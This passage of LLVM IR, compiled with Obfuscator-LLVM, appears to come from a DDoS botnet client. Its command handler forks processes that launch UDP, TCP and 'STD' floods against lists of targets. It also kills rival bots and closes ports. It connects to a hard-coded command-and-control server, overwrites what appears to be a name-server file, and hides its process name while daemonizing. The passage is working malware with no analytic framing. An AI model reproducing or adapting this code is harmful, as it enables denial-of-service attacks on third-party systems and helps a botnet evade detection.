  %133 = tail call i32 @atoi(i8* %117) #14
  br i1 %122, label %134, label %138

; <label>:134:                                    ; preds = %128
  %135 = getelementptr inbounds i8*, i8** %1, i64 5
  %136 = load i8*, i8** %135, align 8
  %137 = tail call i32 @atoi(i8* %136) #14
  br label %138

; <label>:138:                                    ; preds = %128, %134
  %139 = phi i32 [ %137, %134 ], [ 10, %128 ]
  %strchr = tail call i8* @strchr(i8* %130, i32 44)
  %140 = icmp eq i8* %strchr, null
  br i1 %140, label %147, label %.preheader126.preheader

.preheader126.preheader:                          ; preds = %138
  br label %.preheader126

.preheader126:                                    ; preds = %.preheader126.preheader, %143
  %.sink = phi i8* [ null, %143 ], [ %130, %.preheader126.preheader ]
  %141 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i64 0, i64 0)) #7
  %142 = icmp eq i8* %141, null
  br i1 %142, label %.loopexit127.loopexit, label %143

; <label>:143:                                    ; preds = %.preheader126
  %144 = tail call i32 @listFork()
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %.preheader126

; <label>:146:                                    ; preds = %143
  tail call void @SendUDP(i8* nonnull %141, i32 %131, i32 %132, i32 %133, i32 %139, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:147:                                    ; preds = %138
  %148 = tail call i32 @listFork()
  %149 = icmp eq i32 %148, 0
  br i1 %149, label %150, label %268

; <label>:150:                                    ; preds = %147
  tail call void @SendUDP(i8* %130, i32 %131, i32 %132, i32 %133, i32 %139, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit127.loopexit:                            ; preds = %.preheader126
  %.pre141 = load i8*, i8** %1, align 8
  br label %.loopexit127

.loopexit127:                                     ; preds = %.loopexit127.loopexit, %100
  %151 = phi i8* [ %.pre141, %.loopexit127.loopexit ], [ %67, %100 ]
  %152 = tail call i32 @strcmp(i8* %151, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.314, i64 0, i64 0)) #14
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %154, label %.loopexit125

; <label>:154:                                    ; preds = %.loopexit127
  %155 = icmp slt i32 %0, 6
  br i1 %155, label %268, label %156

; <label>:156:                                    ; preds = %154
  %157 = getelementptr inbounds i8*, i8** %1, i64 3
  %158 = load i8*, i8** %157, align 8
  %159 = tail call i32 @atoi(i8* %158) #14
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %268, label %161

; <label>:161:                                    ; preds = %156
  %162 = getelementptr inbounds i8*, i8** %1, i64 2
  %163 = load i8*, i8** %162, align 8
  %164 = tail call i32 @atoi(i8* %163) #14
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %268, label %166

; <label>:166:                                    ; preds = %161
  %167 = getelementptr inbounds i8*, i8** %1, i64 5
  %168 = load i8*, i8** %167, align 8
  %169 = tail call i32 @atoi(i8* %168) #14
  %170 = icmp slt i32 %169, 0
  br i1 %170, label %268, label %171

; <label>:171:                                    ; preds = %166
  %172 = icmp eq i32 %0, 7
  br i1 %172, label %173, label %178

; <label>:173:                                    ; preds = %171
  %174 = getelementptr inbounds i8*, i8** %1, i64 6
  %175 = load i8*, i8** %174, align 8
  %176 = tail call i32 @atoi(i8* %175) #14
  %177 = icmp slt i32 %176, 1
  br i1 %177, label %268, label %178

; <label>:178:                                    ; preds = %173, %171
  %179 = getelementptr inbounds i8*, i8** %1, i64 1
  %180 = load i8*, i8** %179, align 8
  %181 = tail call i32 @atoi(i8* %163) #14
  %182 = tail call i32 @atoi(i8* %158) #14
  %183 = getelementptr inbounds i8*, i8** %1, i64 4
  %184 = load i8*, i8** %183, align 8
  br i1 %172, label %185, label %189

; <label>:185:                                    ; preds = %178
  %186 = getelementptr inbounds i8*, i8** %1, i64 6
  %187 = load i8*, i8** %186, align 8
  %188 = tail call i32 @atoi(i8* %187) #14
  br label %189

; <label>:189:                                    ; preds = %178, %185
  %190 = phi i32 [ %188, %185 ], [ 10, %178 ]
  %191 = tail call i32 @atoi(i8* %168) #14
  %strchr118 = tail call i8* @strchr(i8* %180, i32 44)
  %192 = icmp eq i8* %strchr118, null
  br i1 %192, label %199, label %.preheader124.preheader

.preheader124.preheader:                          ; preds = %189
  br label %.preheader124

.preheader124:                                    ; preds = %.preheader124.preheader, %195
  %.sink120 = phi i8* [ null, %195 ], [ %180, %.preheader124.preheader ]
  %193 = tail call i8* @strtok(i8* %.sink120, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i64 0, i64 0)) #7
  %194 = icmp eq i8* %193, null
  br i1 %194, label %.loopexit125.loopexit, label %195

; <label>:195:                                    ; preds = %.preheader124
  %196 = tail call i32 @listFork()
  %197 = icmp eq i32 %196, 0
  br i1 %197, label %198, label %.preheader124

; <label>:198:                                    ; preds = %195
  tail call void @SendTCP(i8* nonnull %193, i32 %181, i32 %182, i8* %184, i32 %191, i32 %190, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:199:                                    ; preds = %189
  %200 = tail call i32 @listFork()
  %201 = icmp eq i32 %200, 0
  br i1 %201, label %202, label %268

; <label>:202:                                    ; preds = %199
  tail call void @SendTCP(i8* %180, i32 %181, i32 %182, i8* %184, i32 %191, i32 %190, i32 32)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit125.loopexit:                            ; preds = %.preheader124
  %.pre142 = load i8*, i8** %1, align 8
  br label %.loopexit125

.loopexit125:                                     ; preds = %.loopexit125.loopexit, %.loopexit127
  %203 = phi i8* [ %.pre142, %.loopexit125.loopexit ], [ %151, %.loopexit127 ]
  %204 = tail call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.315, i64 0, i64 0)) #14
  %205 = icmp eq i32 %204, 0
  br i1 %205, label %206, label %.loopexit123

; <label>:206:                                    ; preds = %.loopexit125
  %207 = icmp slt i32 %0, 4
  br i1 %207, label %268, label %208

; <label>:208:                                    ; preds = %206
  %209 = getelementptr inbounds i8*, i8** %1, i64 2
  %210 = load i8*, i8** %209, align 8
  %211 = tail call i32 @atoi(i8* %210) #14
  %212 = icmp slt i32 %211, 1
  br i1 %212, label %268, label %213

; <label>:213:                                    ; preds = %208
  %214 = getelementptr inbounds i8*, i8** %1, i64 3
  %215 = load i8*, i8** %214, align 8
  %216 = tail call i32 @atoi(i8* %215) #14
  %217 = icmp slt i32 %216, 1
  br i1 %217, label %268, label %218

; <label>:218:                                    ; preds = %213
  %219 = getelementptr inbounds i8*, i8** %1, i64 1
  %220 = load i8*, i8** %219, align 8
  %strchr119 = tail call i8* @strchr(i8* %220, i32 44)
  %221 = icmp eq i8* %strchr119, null
  br i1 %221, label %228, label %.preheader122.preheader

.preheader122.preheader:                          ; preds = %218
  br label %.preheader122

.preheader122:                                    ; preds = %.preheader122.preheader, %224
  %.sink121 = phi i8* [ null, %224 ], [ %220, %.preheader122.preheader ]
  %222 = tail call i8* @strtok(i8* %.sink121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i64 0, i64 0)) #7
  %223 = icmp eq i8* %222, null
  br i1 %223, label %.loopexit123.loopexit, label %224

; <label>:224:                                    ; preds = %.preheader122
  %225 = tail call i32 @listFork()
  %226 = icmp eq i32 %225, 0
  br i1 %226, label %227, label %.preheader122

; <label>:227:                                    ; preds = %224
  tail call void @SendSTD(i8* nonnull %222, i32 %211, i32 %216)
  unreachable

; <label>:228:                                    ; preds = %218
  %229 = tail call i32 @listFork()
  %230 = icmp eq i32 %229, 0
  br i1 %230, label %231, label %268

; <label>:231:                                    ; preds = %228
  tail call void @SendSTD(i8* %220, i32 %211, i32 %216)
  unreachable

.loopexit123.loopexit:                            ; preds = %.preheader122
  %.pre143 = load i8*, i8** %1, align 8
  br label %.loopexit123

.loopexit123:                                     ; preds = %.loopexit123.loopexit, %.loopexit125
  %232 = phi i8* [ %.pre143, %.loopexit123.loopexit ], [ %203, %.loopexit125 ]
  %233 = tail call i32 @strcmp(i8* %232, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.316, i64 0, i64 0)) #14
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %235, label %236

; <label>:235:                                    ; preds = %.loopexit123
  tail call void @bot_killer()
  tail call void @port_closer()
  %.pre144 = load i8*, i8** %1, align 8
  br label %236

; <label>:236:                                    ; preds = %.loopexit123, %235
  %237 = phi i8* [ %232, %.loopexit123 ], [ %.pre144, %235 ]
  %238 = tail call i32 @strcmp(i8* %237, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i64 0, i64 0)) #14
  %239 = icmp eq i32 %238, 0
  %240 = load i64, i64* @numpids, align 8
  %241 = icmp ne i64 %240, 0
  %or.cond134 = and i1 %239, %241
  br i1 %or.cond134, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %236
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %254
  %.0132 = phi i64 [ %255, %254 ], [ 0, %.lr.ph.preheader ]
  %242 = load i32*, i32** @pids, align 8
  %243 = getelementptr inbounds i32, i32* %242, i64 %.0132
  %244 = load i32, i32* %243, align 4
  %245 = icmp eq i32 %244, 0
  br i1 %245, label %254, label %246

; <label>:246:                                    ; preds = %.lr.ph
  %247 = tail call i32 @getpid() #7
  %248 = icmp eq i32 %244, %247
  br i1 %248, label %254, label %249

; <label>:249:                                    ; preds = %246
  %250 = load i32*, i32** @pids, align 8
  %251 = getelementptr inbounds i32, i32* %250, i64 %.0132
  %252 = load i32, i32* %251, align 4
  %253 = tail call i32 @kill(i32 %252, i32 9) #7
  br label %254

; <label>:254:                                    ; preds = %246, %.lr.ph, %249
  %255 = add i64 %.0132, 1
  %256 = load i64, i64* @numpids, align 8
  %257 = icmp ult i64 %255, %256
  br i1 %257, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %254
  %.pre145 = load i8*, i8** %1, align 8
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %236
  %258 = phi i8* [ %.pre145, %.loopexit.loopexit ], [ %237, %236 ]
  %259 = tail call i32 @strcmp(i8* %258, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.318, i64 0, i64 0)) #14
  %260 = icmp eq i32 %259, 0
  br i1 %260, label %261, label %262

; <label>:261:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #16
  unreachable

; <label>:262:                                    ; preds = %.loopexit
  %263 = tail call i32 @strcmp(i8* %258, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.319, i64 0, i64 0)) #14
  %264 = icmp eq i32 %263, 0
  br i1 %264, label %265, label %268

; <label>:265:                                    ; preds = %262
  tail call void @RemoveTempDirs()
  %266 = load i32, i32* @mainCommSock, align 4
  %267 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %266, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.320, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  br label %268

; <label>:268:                                    ; preds = %262, %228, %199, %147, %82, %56, %2, %206, %208, %213, %154, %156, %161, %166, %173, %103, %105, %110, %115, %123, %70, %72, %77, %42, %265, %53, %21
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #7
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #7
  %15 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %15, i32* @mainCommSock, align 4
  %16 = load i32, i32* @port, align 4
  %17 = call i32 @connectTimeout(i32 %15, i8* nonnull %2, i32 %16, i32 30)
  %18 = icmp eq i32 %17, 0
  %. = zext i1 %18 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() local_unnamed_addr #1 {
  %1 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i64 0, i64 0), i32 513) #7
  %2 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.321, i64 0, i64 0), i32 0) #7
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %8, label %4

; <label>:4:                                      ; preds = %0
  %5 = and i32 %1, 65535
  %6 = tail call i64 @write(i32 %5, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.322, i64 0, i64 0), i64 38) #7
  %7 = tail call i32 @close(i32 %5) #7
  br label %8

; <label>:8:                                      ; preds = %0, %4
  ret void
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #1 {
  %3 = alloca i32, align 4
  %4 = load i8*, i8** %1, align 8
  %5 = tail call i64 @strlen(i8* %4) #14
  tail call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 %5, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i64 0, i64 0), i8** %1, align 8
  %6 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.40 to i64), i32 0, i32 0, i32 0) #7
  %7 = tail call i64 @time(i64* null) #7
  %8 = tail call i32 @getpid() #7
  %9 = zext i32 %8 to i64
  %10 = xor i64 %9, %7
  %11 = trunc i64 %10 to i32
  tail call void @srand(i32 %11) #7
  %12 = tail call i64 @time(i64* null) #7
  %13 = tail call i32 @getpid() #7
  %14 = zext i32 %13 to i64
  %15 = xor i64 %14, %12
  %16 = trunc i64 %15 to i32
  tail call void @init_rand(i32 %16)
  %17 = tail call i32 @fork() #7
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %21, label %19

; <label>:19:                                     ; preds = %2
  %20 = call i32 @waitpid(i32 %17, i32* nonnull %3, i32 0) #7
  call void @exit(i32 0) #16
  unreachable

; <label>:21:                                     ; preds = %2
  %22 = tail call i32 @fork() #7
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %25, label %24

; <label>:24:                                     ; preds = %21
  tail call void @exit(i32 0) #16
  unreachable

; <label>:25:                                     ; preds = %21
  ret i32 0
}

declare i32 @prctl(...) local_unnamed_addr #3

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #14

attributes #0 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind readnone }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{i32 -2146429923}
!5 = !{!6}
!6 = distinct !{!6, !7}
!7 = distinct !{!7, !"LVerDomain"}
!8 = !{!9}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !11}
!11 = !{!"llvm.loop.unroll.disable"}
!12 = distinct !{!12, !2, !3}
!13 = distinct !{!13, !2, !3}
!14 = !{i32 -2146428795}
!15 = !{i32 -2146427355}
!16 = distinct !{!16, !2, !3}
!17 = distinct !{!17, !18, !2, !3}
!18 = !{!"llvm.loop.unroll.runtime.disable"}
!19 = !{i32 -2146426416}
